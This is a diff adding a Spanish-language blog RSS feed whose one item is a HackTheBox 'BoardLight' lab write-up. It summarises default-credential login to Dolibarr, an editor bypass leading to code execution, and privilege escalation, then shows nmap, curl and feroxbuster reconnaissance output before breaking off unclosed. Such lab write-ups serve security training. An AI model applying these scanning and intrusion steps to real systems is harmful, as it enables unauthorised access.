@@ -1,0 +1,594 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>enlightenment on sckull</title>
+    <link>https://sckull.github.io/tags/enlightenment/</link>
+    <description>Recent content in enlightenment on sckull</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <copyright>©{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Sat, 28 Sep 2024 00:00:00 +0000</lastBuildDate>
+    <sy:updatePeriod>daily</sy:updatePeriod>
+    <sy:updateFrequency>daily</sy:updateFrequency>
+    
+        <atom:link href="https://sckull.github.io/tags/enlightenment/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>HackTheBox - BoardLight</title>
+        <link>https://sckull.github.io/posts/boardlight/</link>
+        <pubDate>Sat, 28 Sep 2024 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 28 Sep 2024 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/boardlight/</guid>
+        <description>BoardLight corre Dolibarr en el cual logramos acceder con credenciales por &amp;ldquo;default&amp;rdquo;, ademas descubrimos una vulnerabilidad en la que es posible realizar bypass al editor HTML y permite ejecutar codigo PHP y Comandos en la maquina.</description>
+        <content:encoded>
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;p&gt;BoardLight corre Dolibarr en el cual logramos acceder con credenciales por &amp;ldquo;default&amp;rdquo;, ademas descubrimos una vulnerabilidad en la que es posible realizar bypass al editor HTML y permite ejecutar codigo PHP y Comandos en la maquina. Accedimos a un usuario con las credenciales almacenadas en la configuracion de Dolibarr. Finalmente explotamos una vulnerabilidad en enlightenment que nos permitio escalar privilegios.&lt;/p&gt;
+&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt; muestra multiples puertos abiertos: http (80) y ssh (22).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.94SVN scan initiated Thu Jul 11 22:59:18 2024 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.11&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.11.11
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.070s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Jul 11 22:59:28 2024 -- 1 IP address (1 host up) scanned in 9.29 seconds&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
+&lt;p&gt;Los headers no muestran ninguna redireccion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kali@kali&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/dev/pts/8&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/boardlight&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; curl -sI http://10.10.11.11/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Date: Fri, &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;2024&lt;/span&gt; 02:59:52 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kali@kali&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/dev/pts/8&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/boardlight&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;La tematica del sitio es sobre Ciberseguridad.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071930954.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Observamos en el footer el dominio &lt;code&gt;board.htb&lt;/code&gt; el cual agregamos al archivo /etc/hosts.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/boardlight/Screenshot_2024071930900.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;feroxbuser&lt;/code&gt; muestra unicamente los recursos del sitio.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;kali@kali&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/dev/pts/8&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/boardlight&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; feroxbuster -u http://board.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                                                                                                                                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; ___  ___  __   __     __      __         __   ___
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher 🤓                 ver: 2.10.3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;───────────────────────────┬──────────────────────
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🎯  Target Url            │ http://board.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🚀  Threads               │ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 👌  Status Codes          │ All Status Codes!
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 💥  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        │ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🦡  User-Agent            │ feroxbuster/2.10.3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🔎  Extract Links         │ &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🏁  HTTP methods          │ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GET&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🔃  Recursion Depth       │ &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;───────────────────────────┴──────────────────────
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 🏁  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Management Menu™
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;──────────────────────────────────────────────────
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;404&lt;/span&gt;      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; toggle off with --dont-filter
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;403&lt;/span&gt;      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; toggle off with --dont-filter
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        9l       28w      307c http://board.htb/images &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://board.htb/images/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        9l       28w      303c http://board.htb/js &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://board.htb/js/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      GET        9l       28w      304c http://board.htb/css &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; http://board.htb/css/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        5l       48w     1493c http://board.htb/images/fb.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET       11l       50w     2892c http://board.htb/images/d-1.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        9l       24w     2405c http://board.htb/images/d-2.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        5l       23w     1217c http://board.htb/images/location-white.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      100l      178w     1904c http://board.htb/css/responsive.css
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        6l       12w      491c http://board.htb/images/user.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        5l       55w     1797c http://board.htb/images/linkedin.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        6l       52w     1968c http://board.htb/images/twitter.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET      280l      652w     9100c http://board.htb/about.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        7l       48w     3995c http://board.htb/images/d-5.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        6l       57w     1878c http://board.htb/images/youtube.png
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      GET        5l       14w     1227c http://board.htb/images/insta.png
